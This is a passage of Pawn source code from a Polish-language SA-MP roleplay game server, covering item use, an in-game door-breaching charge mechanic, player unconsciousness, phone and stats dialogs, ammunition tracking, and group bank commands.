				format(msg, sizeof(msg), "Nieznajomy_%d", playerid+7542);
				if(PlayerCache[playerid][pGender])
				format(msg, sizeof(msg), "Nieznajoma_%d", playerid+7542);
				SetPlayerName(playerid, msg);
				UpdatePlayerName(playerid);
				SetPlayerScore(playerid, 0);
			}

			ItemCache[itemuid][iActive] = 1;
		}
		case 13:
		{
			new list[525], info[128];
			for(new i; i<MAX_ITEMS; i++)
			{
				if(ItemCache[i][iState] == 4)
				{
					if(ItemCache[i][iOwner] == itemuid)
					{
						format(info, sizeof(info), "%d\t%s\n", ItemCache[i][iUID], ItemCache[i][iName]);
						strins(list, info, strlen(list));
					}
				}
			}
			if(Isnull(list))
			return ShowDialogInfo(playerid, "Ta torba jest pusta.");
			return ShowPlayerDialog(playerid, D_BAG, DIALOG_STYLE_LIST, "Torba", list, "Wyjmij", "Zamknij");
		}
		case 14:
		{
		/*	new vid = GetPlayerCameraTargetVehicle(playerid);
			if(vid != INVALID_VEHICLE_ID)
			{
				new Float:posX, Float:posY, Float:posZ, Float:angle, model, fuel, playerUID, groupUID, register, color, color2, Float:health;
				GetVehicleData(vid, model, fuel, posX, posY, posZ, angle, playerUID, groupUID, register, color, color2, health);

				if(register)
					return TextDrawForPlayerEx(playerid, 1, "Ten pojazd posiada juz rejestracje.", 3000);
				if( !HasPlayerAccessToVehicle(playerid, vid))
					return TextDrawForPlayerEx(playerid, 1, "Brak uprawnien.", 3000);
			

				new query[128];
				format(query, sizeof(query), "UPDATE vehicles SET register=1 WHERE gameId=%d;", vid);
				mysql_query(DB_HANDLE, query, false);
				
				UnSpawnVehicle(vid);
				SpawnVehicle(vid);
				ShowDialogInfo(playerid, "Pomyœlnie zamontowano rejstracjê pojazdu.");
				ItemCache[itemuid][iState] = 2;
			}*/
			return TextDrawForPlayerEx(playerid, 1, "Spojrz na pojazd na, ktory chcesz nalozyc nowa rejestracje.", 3000);
		}
		case 15:
		{
			new list[128], info[32];
			for(new i; i<MAX_ITEMS; i++)
			{
				if(ItemCache[i][iState] == 0)
				{
					if(ItemCache[i][iOwner] == PlayerCache[playerid][pUID])
					{
						if(ItemCache[i][iType] == 2)
						{
							format(info, sizeof(info), "%d\t%s\n", ItemCache[i][iUID], ItemCache[i][iName]);
							strins(list, info, strlen(list));
						}
					}
				}
			}
			if(Isnull(list))
			return ShowDialogInfo(playerid, "Nie znaleziono pasuj¹cych przedmiotów.");
			pVal[playerid] = itemuid;
			return ShowPlayerDialog(playerid, D_SIM, DIALOG_STYLE_LIST, "Pasuj¹ce przedmioty", list, "Wybierz", "Anuluj");
		}
		case 16:
		{
			for(new i; i<MAX_ITEMS; i++)
			{
				if(ItemCache[i][iType] == 16)
				{
					if(ItemCache[i][iUID] != itemuid)
					{
						if(ItemCache[i][iState] == 0)
						{
							if(ItemCache[i][iOwner] == PlayerCache[playerid][pUID])
							{
								if(ItemCache[i][iActive])
								return SendClientMessage(playerid, COLOR_GRAY, "Nie mo¿esz mieæ aktywnych wiêcej karnetów si³owych.");
							}
						}
					}
				}
			}
			if(ItemCache[itemuid][iActive])
			{
				ItemCache[itemuid][iActive] = 0;
				return ShowDialogInfo(playerid, "Dezaktywowano karnet.");
			}
/*			new guid = ItemCache[itemuid][iGroupSender];
			for(new i; i<LastdUID; i++)
			{
				if(!DoorCache[i][dDestroyed])
				{
					if(DoorCache[i][dGroupUID] == guid)
					{
						ItemCache[itemuid][iActive] = 1;
						return ShowDialogInfo(playerid, "Karnet si³owy zosta³ aktywowany.\nNajedŸ kamer¹ na przyrz¹d do æwiczeñ i naciœnij 'Y' by zacz¹æ æwiczyæ");
					}
				}
			}*/
			return ShowDialogInfo(playerid, "Ten karnet mo¿e byæ aktywowany tylko w si³owni w, której zosta³ zakupiony.");
		}
		case 17:
		{
		/*	if(GroupCache[pDuty[playerid]][gType] == 1 || GroupCache[pDuty[playerid]][gType] == 16)
			{
				if(pDetonatorTimer[playerid])
				return GameTextForPlayer(playerid, "~r~juz wysadzasz jakies drzwi!", 3000, 4);
				for(new i; i<LastdUID; i++)
				{
					if(!DoorCache[i][dDestroyed])
					{
						if(!DoorCache[i][dOpen])
						{
							if(IsPlayerInRangeOfPoint(playerid, 2.5, DoorCache[i][dInsX], DoorCache[i][dInsY], DoorCache[i][dInsZ]))
							{
								if(GetPlayerVirtualWorld(playerid) == DoorCache[i][dInsVW])
								{
									if(GetPlayerVirtualWorld(playerid) == DoorCache[i][dOutVW])
									{
										pDetonatorTime[playerid] = 10;
										ApplyAnimation(playerid, "BOMBER", "BOM_Plant",4.1, 0, 0, 0, 0, 0);
										pDetonatorTimer[playerid] = SetTimerEx("DetonatorTimer", 1000, true, "iii", playerid, i, pDuty[playerid]); // pDuty[playerid] - Group UID
										pDetonatorUID[playerid] = itemuid;
										new str[64]; format(str, sizeof(str), "podk³ada %s.", ItemCache[itemuid][iName]);
										PlayerPlaySoundInRange(playerid, 25800, 7.5);
										return SendPlayerMe(playerid, str);
									}
								}
							}
							if(IsPlayerInRangeOfPoint(playerid, 2.5, DoorCache[i][dOutX], DoorCache[i][dOutY], DoorCache[i][dOutZ]))
							{
								if(GetPlayerVirtualWorld(playerid) == DoorCache[i][dOutVW])
								{
									pDetonatorTime[playerid] = 10;
									ApplyAnimation(playerid, "BOMBER", "BOM_Plant",4.1, 0, 0, 0, 0, 0);
									pDetonatorTimer[playerid] = SetTimerEx("DetonatorTimer", 1000, true, "iii", playerid, i, pDuty[playerid]); // pDuty[playerid] - Group UID
									pDetonatorUID[playerid] = itemuid;
									new str[64]; format(str, sizeof(str), "podk³ada %s.", ItemCache[itemuid][iName]);
									PlayerPlaySoundInRange(playerid, 25800, 7.5);
									return SendPlayerMe(playerid, str);
								}
							}
						}
					}
				}
				return GameTextForPlayer(playerid, "~r~nie znajdujesz sie w poblizu zamknietych drzwi", 2000, 4);
			}
			return TextDrawForPlayerEx(playerid, 1, "Musisz znajdowac sie na sluzbie odpowiedniej grupy by moc uzyc ladunku wybuchowego.", 3000);*/
		}
	}
	return 1;
}

forward DestroyDynObjects(obj, obj2, obj3, obj4);
public DestroyDynObjects(obj, obj2, obj3, obj4)
{
	DestroyDynamicObject(obj);
	DestroyDynamicObject(obj2);
	DestroyDynamicObject(obj3);
	DestroyDynamicObject(obj4);
}

stock BWPlayer(playerid, bwtime, reason)
{
	pShowingWeapon[playerid] = true;
	SetTimerEx("ShowingWeapon", 3000, false, "i", playerid);
	
	GetPlayerPos(playerid, PlayerCache[playerid][pPosX], PlayerCache[playerid][pPosY], PlayerCache[playerid][pPosZ]);
	PlayerCache[playerid][pPosVW] = GetPlayerVirtualWorld(playerid);
	SendPlayerMe(playerid, "traci przytomnoœæ");
	PlayerCache[playerid][pBW_Reason] = reason;
	PlayerCache[playerid][pHealth]=1;
	SetPlayerCameraPos(playerid, PlayerCache[playerid][pPosX], PlayerCache[playerid][pPosY], PlayerCache[playerid][pPosZ]+10.0);
	SetPlayerCameraLookAt(playerid, PlayerCache[playerid][pPosX], PlayerCache[playerid][pPosY], PlayerCache[playerid][pPosZ], CAMERA_CUT);
	PlayerCache[playerid][pBW_Time] = bwtime;
	new msg[64];
	format(msg, sizeof(msg),  "Stan nieprzytomnosci przez: %dmin", PlayerCache[playerid][pBW_Time]);
	TextDrawForPlayer(playerid, 2, msg);
	ResetPlayerWeapons(playerid);


	TogglePlayerControllable(playerid, 0);
	if(!IsPlayerInAnyVehicle(playerid)){
		ClearAnimations(playerid);
		ApplyAnimation(playerid, "crack", "crckdeth1", 4.1, 0, 0, 0, 1, 0, 0);
	}
		

	UpdatePlayerName(playerid);
	return 1;
}

forward DetonatorTimer(playerid, dooruid, groupuid);
public DetonatorTimer(playerid, dooruid, groupuid)
{
	/*new time[32]; format(time, sizeof(time), "~r~~h~detonacja za:~n~~r~~h~%d", pDetonatorTime[playerid]);
	pDetonatorTime[playerid]--;
	if(pDetonatorTime[playerid] == 0)
	{
		time = "~r~zdetonowano ladunek.";
		KillTimer(pDetonatorTimer[playerid]);
		pDetonatorTimer[playerid] = 0;
		SetTimerEx("DestroyDynObjects", 5000, false, "iiii",
		CreateDynamicObject(18685, DoorCache[dooruid][dInsX],  DoorCache[dooruid][dInsY],  DoorCache[dooruid][dInsZ]-1,0.0, 0.0, 0.0, DoorCache[dooruid][dInsVW], 0, -1, STREAMER_OBJECT_SD, STREAMER_OBJECT_DD),
		CreateDynamicObject(18685, DoorCache[dooruid][dOutX],  DoorCache[dooruid][dOutY],  DoorCache[dooruid][dOutZ]-1,0.0, 0.0, 0.0, DoorCache[dooruid][dOutVW], 0, -1, STREAMER_OBJECT_SD, STREAMER_OBJECT_DD),
		CreateDynamicObject(18715, DoorCache[dooruid][dOutX],  DoorCache[dooruid][dOutY],  DoorCache[dooruid][dOutZ]-1,0.0, 0.0, 0.0, DoorCache[dooruid][dOutVW], 0, -1, STREAMER_OBJECT_SD, STREAMER_OBJECT_DD),
		CreateDynamicObject(18715, DoorCache[dooruid][dInsX],  DoorCache[dooruid][dInsY],  DoorCache[dooruid][dInsZ]-1,0.0, 0.0, 0.0, DoorCache[dooruid][dInsVW], 0, -1, STREAMER_OBJECT_SD, STREAMER_OBJECT_DD));
		for(new i; i<=GetPlayerPoolSize(); i++)
		{
			if(IsPlayerConnected(i))
			{
				if(IsPlayerInRangeOfPoint(i, 5, DoorCache[dooruid][dInsX], DoorCache[dooruid][dInsY], DoorCache[dooruid][dInsZ]))
				{
					if(GetPlayerVirtualWorld(i) == DoorCache[dooruid][dInsVW])
					{
						if(PlayerCache[i][pHealth] - 50 <= 0)
						BWPlayer(i, 5, 51);
						else
						SetPlayerHP(i, PlayerCache[playerid][pHealth]-50);
					}
				}
				else if(IsPlayerInRangeOfPoint(i, 5, DoorCache[dooruid][dOutX], DoorCache[dooruid][dOutY], DoorCache[dooruid][dOutZ]))
				{
					if(GetPlayerVirtualWorld(i) == DoorCache[dooruid][dOutVW])
					{
						if(PlayerCache[i][pHealth] - 50 <= 0)
						BWPlayer(i, 5, 51);
						else
						SetPlayerHP(i, PlayerCache[playerid][pHealth]-50);
					}
				}
				if(IsPlayerInRangeOfPoint(i, 20, DoorCache[dooruid][dOutX], DoorCache[dooruid][dOutY], DoorCache[dooruid][dOutZ]))
				{
					if(GetPlayerVirtualWorld(i) == DoorCache[dooruid][dOutVW])
					{
						PlayerPlaySound(i, 17003, 0, 0, 0);
						Streamer_Update(i);
					}
				}
				else if(IsPlayerInRangeOfPoint(i, 20, DoorCache[dooruid][dInsX], DoorCache[dooruid][dInsY], DoorCache[dooruid][dInsZ]))
				{
					if(GetPlayerVirtualWorld(i) == DoorCache[dooruid][dInsVW])
					{
						PlayerPlaySound(i, 17003, 0, 0, 0);
						Streamer_Update(i);
					}
				}
			}
		}
		DoorCache[dooruid][dOpen] = true;
		ItemCache[pDetonatorUID[playerid]][iState] = ITEM_STATE_DESTROYED;
		DoorCache[dooruid][dExplodeTime] = gettime();
	}
	for(new i; i<=GetPlayerPoolSize(); i++)
	{
		if(IsPlayerConnected(i))
		{
			if(pDuty[i] == groupuid)
			{
				if(IsPlayerInRangeOfPoint(i, 15, DoorCache[dooruid][dInsX], DoorCache[dooruid][dInsY], DoorCache[dooruid][dInsZ]))
				{
					if(GetPlayerVirtualWorld(i) == DoorCache[dooruid][dInsVW])
					{
						GameTextForPlayer(i, time, 1000, 4);
						PlayerPlaySound(i, 1056, 0, 0, 0);
					}
				}
				if(IsPlayerInRangeOfPoint(i, 15, DoorCache[dooruid][dOutX], DoorCache[dooruid][dOutY], DoorCache[dooruid][dOutZ]))
				{
					if(GetPlayerVirtualWorld(i) == DoorCache[dooruid][dOutVW])
					{
						GameTextForPlayer(i, time, 1000, 4);
						PlayerPlaySound(i, 1056, 0, 0, 0);
					}
				}
			}
		}
	}*/
}

forward RepairingVehicle(playerid);
public RepairingVehicle(playerid)
{
	/*new targetid = GetPlayerCameraTargetVehicle(playerid);
	new targetuid = GetVehicleUID(targetid);
	if(targetuid != PlayerRepairingVehicle[playerid][repairVehicleID])
	return GameTextForPlayer(playerid, "~r~~h~spojrz na pojazd", 1000, 4);
	new Float:X, Float:Y, Float:Z;
	GetVehiclePos(targetid, X, Y, Z);
	if(!IsPlayerInRangeOfPoint(playerid, 5.0, X, Y, Z))
	return GameTextForPlayer(playerid, "~r~~h~stan blizej!", 1000, 4);
	new str[64];
	format(str, sizeof(str), "~b~~h~~h~~h~%d", PlayerRepairingVehicle[playerid][repairTime]);
	GameTextForPlayer(playerid, str, 1000, 4);
	PlayerRepairingVehicle[playerid][repairTime]--;
	format(str, sizeof(str), "~b~~h~~h~~h~%d", PlayerRepairingVehicle[playerid][repairTime]);
	if(PlayerRepairingVehicle[playerid][repairTime] != 0)
	{
		format(str, sizeof(str), "~b~~h~~h~~h~%d", PlayerRepairingVehicle[playerid][repairTime]);
	}
	else
	{
		GameTextForPlayer(playerid, "~b~~h~~h~~h~gotowe!", 1000, 4);
	}
	if(PlayerRepairingVehicle[playerid][repairTime] == 0)
	{
		new vuid = PlayerRepairingVehicle[playerid][repairVehicleID];
		new val;
		for(new i; i<MAX_ITEMS; i++)
		{
			if(ItemCache[i][iState] == 0)
			{
				if(ItemCache[i][iType] == 9)
				{
					if(ItemCache[i][iActive])
					{
						if(ItemCache[i][iOwner] == PlayerCache[playerid][pUID])
						{
							val = ItemCache[i][iVal];
							ItemCache[i][iState] = 3;
							ItemCache[i][iActive] = 0;
						}
					}
				}
			}
		}
		 PlayerCache[playerid][pCurrentVehicle][vHP] =  PlayerCache[playerid][pCurrentVehicle][vHP] + val;
		SetVehicleHealth( PlayerCache[playerid][pCurrentVehicle][vID],  PlayerCache[playerid][pCurrentVehicle][vHP]);
		PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
		KillTimer(PlayerRepairingVehicle[playerid][repairTimer]);
	}*/
	return 1;
}

forward DestroyIcon(playerid);
public DestroyIcon(playerid)
{
	KillTimer(MapIconTimer[playerid]);
	DestroyDynamicMapIcon(MapIcon[playerid]);
}

stock ShowDialogBoomBox(playerid)
return ShowPlayerDialog(playerid, D_BOOMBOX, DIALOG_STYLE_INPUT, "Boombox", ""HEX_BLUE"Podaj adres "HEX_GREEN"URL"HEX_BLUE" do muzyki z boomboxa.", "Gotowe!", "Anuluj");

stock GetPlayerPhoneNumber(playerid)
{
	for(new i; i<MAX_ITEMS; i++)
	{
		if(ItemCache[i][iState] == 0)
		{
			if(ItemCache[i][iOwner] == PlayerCache[playerid][pUID])
			{
				if(ItemCache[i][iType] == 2)
				{
					if(ItemCache[i][iActive])
					{
						return ItemCache[i][iVal];
					}
				}
			}
		}
	}
	return 0;
}

stock ShowDialogAnswer(playerid)
{
	new header[64]; format(header, sizeof(header), "Po³¹czenie od numeru: %d", GetPlayerPhoneNumber(pCalling[playerid])+50000);
	return ShowPlayerDialog(playerid, D_ANSWER, DIALOG_STYLE_LIST, header, "1\t"HEX_GREEN"Odbierz\n2\t"HEX_RED"Odrzuæ", "Wybierz", "Anuluj");
}

stock ShowDialogPhone(playerid)
{
	new h, m, s; gettime(h, m, s);
	new header[64]; format(header, sizeof(header), "%s [%02d:%02d:%02d] Numer: %d", ItemCache[pVal[playerid]][iName], h, m, s, ItemCache[pVal[playerid]][iVal2]+50000);
	return ShowPlayerDialog(playerid, D_PHONE, DIALOG_STYLE_LIST, header, ""HEX_BLUE"1\tKontakty\n2\tWyœlij SMS\n"HEX_GREEN"3\tWyœlij VCard\n"HEX_YELLOW"4\tWyjmij kartê SIM\n"HEX_RED"5\tWy³¹cz telefon", "Wybierz", "Anuluj");
}

stock ShowDialogUseWeap(playerid)
{
	return ShowPlayerDialog(playerid, D_USE_WEAP, DIALOG_STYLE_INPUT, "U¿ycie broni", ""HEX_WHITE"Napisz z/do którego wyjmujesz/chowasz swoj¹ broñ.\nNp. Z kabury/do kabury.", "U¿yj", "Anuluj");
}

forward TurnOffAlarm(dooruid);
public TurnOffAlarm(dooruid)
{
	//DoorCache[dooruid][dPlayingAlarm] = false;
}

public OnPlayerWeaponShot(playerid, weaponid, hittype, hitid, Float:fX, Float:fY, Float:fZ)
{
	if(weaponid != WeaponCache[playerid][wcVal])
	{
		return !KickPlayer(playerid, "System", "Weapon Cheat (A)");
	}
	if(hittype == BULLET_HIT_TYPE_VEHICLE)
		return 0;
	if(weaponid != 23)
	{
		/*if(GetPlayerVirtualWorld(playerid) != 0)
		{
			new duid = GetPlayerDoorUID(playerid);
			if(DoorCache[duid][dAlarm] && !DoorCache[duid][dPlayingAlarm])
			{
				new msg[128];
				format(msg, sizeof(msg), "** Pad³y strza³y! Zg³oszenie zosta³o oznaczone na radarze. **");

				new id;

				DoorCache[duid][dPlayingAlarm] = true;

				SetTimerEx("TurnOffAlarm", 5000*60, false, "i", duid);

				for(new i; i<=GetPlayerPoolSize(); i++)
				{
					if(GroupCache[PlayerCache[i][pGroup]][gType] == 1 || GroupCache[PlayerCache[i][pGroup2]][gType] == 1 ||
					GroupCache[PlayerCache[i][pGroup3]][gType] == 1)
					{
						SendClientMessage(i, COLOR_GREEN, "** Centrala **");
						SendClientMessage(i, COLOR_GREEN, msg);
						id = CreateDynamicMapIcon(DoorCache[duid][dInsX], DoorCache[duid][dInsY],DoorCache[duid][dInsZ], 0, COLOR_DARKRED, 0, 0, i, 60000, MAPICON_GLOBAL_CHECKPOINT);
						SetTimerEx("DestroyIconZ", 60000*10, false, "i", id);
					}
				}
			}
		}*/
	}
	new query[64];
	if(WeaponCache[playerid][wcVal2] == 1)
	{
		ResetPlayerWeapons(playerid);

		format(query, sizeof(query), "UPDATE items SET val2 = '%d' WHERE uid = '%d' LIMIT 1", WeaponCache[playerid][wcVal2], WeaponCache[playerid][wcUID]);
		mysql_query(DB_HANDLE, query);

		WeaponCache[playerid][wcVal] = 0;

		return SendClientMessage(playerid, COLOR_GRAY, "W broni skoñczy³a siê amunicja.");
	}
	WeaponCache[playerid][wcVal2]--;
	format(query, sizeof(query)," UPDATE items SET val2 = '%d' WHERE uid = '%d' LIMIT 1", WeaponCache[playerid][wcVal2], WeaponCache[playerid][wcUID]);
	mysql_query(DB_HANDLE, query);
	if(WeaponCache[playerid][wcVal3] == 1)
	PlayerPlaySoundInRange(playerid, 6003, 10);
	
	return 1;
}

public OnPlayerShootDynamicObject(playerid, weaponid, objectid, Float:x, Float:y, Float:z)
{
	if(weaponid != WeaponCache[playerid][wcVal])
	{
		return !KickPlayer(playerid, "System", "Weapon Cheat (A)");
	}
	if(weaponid != 23)
	{
		if(GetPlayerVirtualWorld(playerid) != 0)
		{
			new duid = GetPlayerDoorUID(playerid);
			/*if(DoorCache[duid][dAlarm] && !DoorCache[duid][dPlayingAlarm])
			{
				new msg[128];
				format(msg, sizeof(msg), "** Pad³y strza³y! Zg³oszenie zosta³o oznaczone na radarze. **");

				new id;

				DoorCache[duid][dPlayingAlarm] = true;

				SetTimerEx("TurnOffAlarm", 5000*60, false, "i", duid);

				for(new i; i<=GetPlayerPoolSize(); i++)
				{
					if(GroupCache[PlayerCache[i][pGroup]][gType] == 1 || GroupCache[PlayerCache[i][pGroup2]][gType] == 1 ||
					GroupCache[PlayerCache[i][pGroup3]][gType] == 1)
					{
						SendClientMessage(i, COLOR_GREEN, "** Centrala **");
						SendClientMessage(i, COLOR_GREEN, msg);
						id = CreateDynamicMapIcon(DoorCache[duid][dInsX], DoorCache[duid][dInsY],DoorCache[duid][dInsZ], 0, COLOR_DARKRED, 0, 0, i, 60000, MAPICON_GLOBAL_CHECKPOINT);
						SetTimerEx("DestroyIconZ", 60000*10, false, "i", id);
					}
				}
			}*/
		}
	}
	new query[64];
	if(WeaponCache[playerid][wcVal2] == 1)
	{
		ResetPlayerWeapons(playerid);

		format(query, sizeof(query), "UPDATE items SET val2 = '%d' WHERE uid = '%d' LIMIT 1", WeaponCache[playerid][wcVal2], WeaponCache[playerid][wcUID]);
		mysql_query(DB_HANDLE, query);

		WeaponCache[playerid][wcVal] = 0;

		return SendClientMessage(playerid, COLOR_GRAY, "W broni skoñczy³a siê amunicja.");
	}
	WeaponCache[playerid][wcVal2]--;
	format(query, sizeof(query)," UPDATE items SET val2 = '%d' WHERE uid = '%d' LIMIT 1", WeaponCache[playerid][wcVal2], WeaponCache[playerid][wcUID]);
	mysql_query(DB_HANDLE, query);
	if(WeaponCache[playerid][wcVal3] == 1)
	PlayerPlaySoundInRange(playerid, 6003, 10);
	return 1;
}

CMD:stats (playerid, params[])
return ShowDialogStats(playerid);

stock ShowDialogStats(playerid)
{
	new info[1025];
	format(info, sizeof(info), "Postaæ\tCzas gry\n%s\t%dh %dmin\n\
	Zdrowie:\t%s%fHP\t \n\
	Aktualnie ubranie:\t"HEX_WHITE"%d\n\
	Standardowy skin:\t"HEX_WHITE"%d\n\
	Gotówka:\t"HEX_GREEN"$%d\n\
	Czas BW:\t"HEX_WHITE"%d\n\
	Czas AJ:\t"HEX_WHITE"%d\n\
	Punkty Premium:\t"HEX_WHITE"%d\n\
	Virtual World:\t"HEX_WHITE"%d\n\
	Bank:\t"HEX_GREEN"$%d"HEX_BLUE"\n\
	Si³a:\t%dj\n\
	---\n\
	1\tUstawienia postaci\n\
	2\tUs³ugi\n\
	3\tDokumenty postaci\n\
	4\tPrze³¹czniki postaci",
	strreplace(ReturnPlayerName(playerid), '_', ' '),
	PlayerCache[playerid][pPlayTime]/60,
	PlayerCache[playerid][pPlayTime]-(PlayerCache[playerid][pPlayTime]/60)*60,
	GetHPHex(PlayerCache[playerid][pHealth]),
	PlayerCache[playerid][pHealth],
	GetPlayerSkin(playerid),
	PlayerCache[playerid][pSkin],
	PlayerCache[playerid][pCash],
	PlayerCache[playerid][pBW_Time],
	PlayerCache[playerid][pAJ_Time],
	PlayerCache[playerid][pScore],
	GetPlayerVirtualWorld(playerid),
	PlayerCache[playerid][pBank],
	PlayerCache[playerid][pStrenght]);
	return ShowPlayerDialog(playerid, D_STATS, DIALOG_STYLE_TABLIST_HEADERS, "Statystyki", info, "Wybierz", "Anuluj");
}

stock SendMeInRange(playerid, msg[])
{
	return SendPlayerMe(playerid, msg);
}

stock Do(playerid, const text[])
{
	new msg[128]; format(msg, sizeof(msg), text);
	new Float:X, Float:Y, Float:Z;
	GetPlayerPos(playerid, X, Y, Z);
	new vw = GetPlayerVirtualWorld(playerid);
	for(new i; i<=GetPlayerPoolSize(); i++)
	{
		if(IsPlayerConnected(i))
		{
			if(GetPlayerVirtualWorld(i) == vw)
			{
				if(IsPlayerInRangeOfPoint(i, 1.0, X, Y, Z))
				{
					if(strlen(msg) >= 86)
					{
						new temp1[128], temp2[128];
						temp1 = msg, temp2=msg;
						strdel(temp1, 86, strlen(temp1));
						strins(temp1, "...", strlen(temp1));
						strdel(temp2, 0, 86);
						strins(temp2, "...", 0);
						SendClientMessage(i, DO_SHADE_1, temp1);
						SendClientMessage(i, DO_SHADE_1, temp2);
						continue;
					}
					SendClientMessage(i, DO_SHADE_1, msg);
				}
				else if(IsPlayerInRangeOfPoint(i, 4.0, X, Y, Z))
				{
					if(strlen(msg) >= 86)
					{
						new temp1[128], temp2[128];
						temp1 = msg, temp2=msg;
						strdel(temp1, 86, strlen(temp1));
						strins(temp1, "...", strlen(temp1));
						strdel(temp2, 0, 86);
						strins(temp2, "...", 0);
						SendClientMessage(i, DO_SHADE_2, temp1);
						SendClientMessage(i, DO_SHADE_2, temp2);
						continue;
					}
					SendClientMessage(i, DO_SHADE_2, msg);
				}
				else if(IsPlayerInRangeOfPoint(i, 8.0, X, Y, Z))
				{
					if(strlen(msg) >= 86)
					{
						new temp1[128], temp2[128];
						temp1 = msg, temp2=msg;
						strdel(temp1, 86, strlen(temp1));
						strins(temp1, "...", strlen(temp1));
						strdel(temp2, 0, 86);
						strins(temp2, "...", 0);
						SendClientMessage(i, DO_SHADE_3, temp1);
						SendClientMessage(i, DO_SHADE_3, temp2);
						continue;
					}
					SendClientMessage(i, DO_SHADE_3, msg);
				}
				else if(IsPlayerInRangeOfPoint(i, 12.0, X, Y, Z))
				{
					if(strlen(msg) >= 86)
					{
						new temp1[128], temp2[128];
						temp1 = msg, temp2=msg;
						strdel(temp1, 86, strlen(temp1));
						strins(temp1, "...", strlen(temp1));
						strdel(temp2, 0, 86);
						strins(temp2, "...", 0);
						SendClientMessage(i, DO_SHADE_4, temp1);
						SendClientMessage(i, DO_SHADE_4, temp2);
						continue;
					}
					SendClientMessage(i, DO_SHADE_4, msg);
				}
				else if(IsPlayerInRangeOfPoint(i, 16.0, X, Y, Z))
				{
					if(strlen(msg) >= 86)
					{
						new temp1[128], temp2[128];
						temp1 = msg, temp2=msg;
						strdel(temp1, 86, strlen(temp1));
						strins(temp1, "...", strlen(temp1));
						strdel(temp2, 0, 86);
						strins(temp2, "...", 0);
						SendClientMessage(i, DO_SHADE_5, temp1);
						SendClientMessage(i, DO_SHADE_5, temp2);
						continue;
					}
					SendClientMessage(i, DO_SHADE_5, msg);
				}
				else if(IsPlayerInRangeOfPoint(i, 20.0, X, Y, Z))
				{
					if(strlen(msg) >= 86)
					{
						new temp1[128], temp2[128];
						temp1 = msg, temp2=msg;
						strdel(temp1, 86, strlen(temp1));
						strins(temp1, "...", strlen(temp1));
						strdel(temp2, 0, 86);
						strins(temp2, "...", 0);
						SendClientMessage(i, DO_SHADE_6, temp1);
						SendClientMessage(i, DO_SHADE_6, temp2);
						continue;
					}
					SendClientMessage(i, DO_SHADE_6, msg);
				}
			}
		}
	}
	return 1;
}

stock GetHPHex(Float:HP)
{
	new hex[16];
	if(HP < 10)
	hex = HEX_RED;
	else
	hex = HEX_GREEN;
	return hex;
}

CMD:g (playerid, params[])
{
/*	if(!Isnull(params))
	{
		new slot, sub[32], targetid;
		sscanf(params, "is[32]i", slot, sub, targetid);
		switch(slot)
		{
			case 1: if(PlayerCache[playerid][pGroup] == 0) return SendClientMessage(playerid, COLOR_GRAY, "Pod wybranym slotem nie znajduje siê ¿adna grupa.");
			case 2: if(PlayerCache[playerid][pGroup2] == 0) return SendClientMessage(playerid, COLOR_GRAY, "Pod wybranym slotem nie znajduje siê ¿adna grupa.");
			case 3: if(PlayerCache[playerid][pGroup3] == 0) return SendClientMessage(playerid, COLOR_GRAY, "Pod wybranym slotem nie znajduje siê ¿adna grupa.");
			default: return SendClientMessage(playerid, COLOR_GRAY, "Nieprawid³owy slot grupy.");
		}
		if(!Isnull(sub))
		{
			if(!strcmp(sub, "wyplac", true))
			{
				new guid;
				if(targetid < 1)
				return SendClientMessage(playerid, COLOR_GRAY, "Z grupy minimalnie wyp³aciæ mo¿esz 1$.");
				switch(slot)
				{
					case 1:	
					{
						if(!PlayerCache[playerid][pGroupAdmin])
						return SendClientMessage(playerid, COLOR_GRAY, "Nie posiadasz uprawnieñ do zarz¹dzania t¹ grup¹.");
						guid = PlayerCache[playerid][pGroup];
						if(GroupCache[guid][gBank] < targetid)
						return SendClientMessage(playerid, COLOR_GRAY, "Na koncie grupy nie znajduje siê a¿ tyle pieniêdzy.");
					}
					case 2:	
					{
						if(!PlayerCache[playerid][pGroupAdmin2])
						return SendClientMessage(playerid, COLOR_GRAY, "Nie posiadasz uprawnieñ do zarz¹dzania t¹ grup¹.");
						guid = PlayerCache[playerid][pGroup2];
						if(GroupCache[guid][gBank] < targetid)
						return SendClientMessage(playerid, COLOR_GRAY, "Na koncie grupy nie znajduje siê a¿ tyle pieniêdzy.");
					}
					case 3:	
					{
						if(!PlayerCache[playerid][pGroupAdmin3])
						return SendClientMessage(playerid, COLOR_GRAY, "Nie posiadasz uprawnieñ do zarz¹dzania t¹ grup¹.");
						guid = PlayerCache[playerid][pGroup3];
						if(GroupCache[guid][gBank] < targetid)
						return SendClientMessage(playerid, COLOR_GRAY, "Na koncie grupy nie znajduje siê a¿ tyle pieniêdzy.");
					}
				}
				GroupCache[guid][gBank] -= targetid;
				PlayerCache[playerid][pBank] += targetid;
				new msg[128]; format(msg, sizeof(msg), "#Bank "HEX_WHITE"Na konto wyp³ynê³a kwota $%d.", targetid);
				return SendClientMessage(playerid, COLOR_GREEN, msg);
			}
			else if(!strcmp(sub, "wplac", true))
			{
				if(targetid < 1 || targetid > 10000)
				return SendClientMessage(playerid, COLOR_GRAY, "Dotacja dla grupy musi znajdowaæ siê w przedziale 1-10000.");
				if(PlayerCache[playerid][pBank] < targetid)
				return SendClientMessage(playerid, COLOR_GRAY, "Nie posiadasz tyle pieniêdzy w banku.");
				PlayerCache[playerid][pBank] -= targetid;
				new msg[128]; format(msg, sizeof(msg), "#Bank "HEX_WHITE"Z konta pobrano kwotê "HEX_RED"-$%d.", targetid);
				SendClientMessage(playerid, COLOR_GREEN, msg);
				new guid;
				switch(slot)
				{
					case 1:	guid = PlayerCache[playerid][pGroup];
					case 2: guid = PlayerCache[playerid][pGroup2];
					case 3: guid = PlayerCache[playerid][pGroup3];
				}
				GroupCache[guid][gBank] += targetid;
				return 1;
			}
			else if(!strcmp(sub, "opusc", true))
			{
				new msg[128];
				switch(slot)
				{
					case 1: 
					{
						format(msg, sizeof(msg), "Opuœci³eœ/aœ grupê %s.", GroupCache[PlayerCache[playerid][pGroup]][gName]);
						PlayerCache[playerid][pGroup] = 0;
					}
					case 2: 
					{
						format(msg, sizeof(msg), "Opuœci³eœ/aœ grupê %s.", GroupCache[PlayerCache[playerid][pGroup2]][gName]);
						PlayerCache[playerid][pGroup2] = 0;
					}
					case 3: 
					{
						format(msg, sizeof(msg), "Opuœci³eœ/aœ grupê %s.", GroupCache[PlayerCache[playerid][pGroup3]][gName]);
						PlayerCache[playerid][pGroup3] = 0;
					}
				}
				return SendClientMessage(playerid, COLOR_GRAY, msg);
			}
			else if(!strcmp(sub, "info", true))
			{
				switch(slot)
				{
					case 1:
					{
